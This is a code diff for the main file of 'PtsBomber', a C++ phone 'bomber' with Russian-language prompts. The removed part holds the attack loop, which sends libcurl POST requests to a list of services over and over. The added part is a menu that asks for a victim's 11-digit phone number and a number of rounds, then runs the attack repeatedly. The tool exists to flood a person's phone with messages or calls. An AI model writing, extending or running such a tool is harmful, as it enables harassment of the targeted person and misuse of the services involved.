@@ -1,53 +1,65 @@
-#include "libs.hpp"
+#define CURRENT_VERSION 1.0
+#define EXAMPLE_NUMBER  79958970861
 
-#include "build/build.hpp"
-
-void attack(int cycles); //Прототип функции
-#include "src/functions.hpp"
-#include "src/services.hpp"
-#include "src/screens.hpp"
+#include "files/libs.h"
+#include "files/services.h"
+#include "files/functions.h"
 
 int main(void)
 {
-    screenSelecting();
+    cout << "PtsBomber " << CURRENT_VERSION << " by Patysonchick\n" << endl;
 
-    return 0;    
-}
+    cout << "Выбери действие(для справки введи 'h')" << endl;
+    actionChoice:
+    cout << ">>> ";
+    char currentAction;
+    cin >> currentAction;
+    cout << endl;
 
-//Самый главный кусок бомбера
-void attack(int cycles)
-{
-    CURL *curl;
-    CURLcode res;
-
-    curl_global_init(CURL_GLOBAL_ALL);
-
-    curl = curl_easy_init();
-    if(curl)
+    switch(currentAction)
     {
-        initServices();
-        cout << "Всего сервисов: " << sizeof(Services)/sizeof(Services[0]) << endl;
-        for(int i=0; i<cycles; i++)
-        {
-            cout << "Текущий круг: " << i+1 << DOUBLE_ENDL;
-
-            for(int i=0; i<sizeof(Services)/sizeof(Services[0]); i++)
+        case 'a':
+            phoneEntering:
+            cout << "Введите номер телефона(например: " << EXAMPLE_NUMBER << "): ";
+            cin >> enteredPhone;
+            if(enteredPhone.size() != 11)
             {
-                cout << "Текущий сервис: " << Services[i].name << endl;
-
-                curl_easy_setopt(curl, CURLOPT_URL, Services[i].url.c_str());
-                //curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
-                curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
-                //curl_easy_setopt(curl, CURLOPT_USERAGENT, userAgent.c_str());
-                curl_easy_setopt(curl, CURLOPT_POST, 1L);
-                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Services[i].data.c_str());
-
-                res = curl_easy_perform(curl);
-                if(res != CURLE_OK){cout << "Ошибка в curl_easy_perform(): " << curl_easy_strerror(res) << endl;}
-                cout << DOUBLE_ENDL;
+                cout << "Телефон введён неправильно" << endl;
+                goto phoneEntering;
             }
-        }
-        curl_easy_cleanup(curl);
+
+            cout << "Введи количество кругов: ";
+            int cyclesCount;
+            cin >> cyclesCount;
+
+            for(int i=0; i<cyclesCount; i++)
+            {
+                cout << endl;
+                cout << "Текущий круг: " << i+1 << endl;
+                attackMode();
+            }
+            
+            goto actionChoice;
+            break;
+
+        case 'e':
+            cout << "Спасибо за использование, удачного дня ;)" << endl;
+            break;
+
+        case 'h':
+            cout << "a - Атака" << endl;
+            cout << "e - Выход" << endl;
+            cout << "h - Справка" << endl;
+
+            goto actionChoice;
+            break;
+
+        default:
+            cout << "Неизвестное действие\n" << endl;
+
+            goto actionChoice;
+            break;
     }
-    curl_global_cleanup();
+
+    return 0;
 }
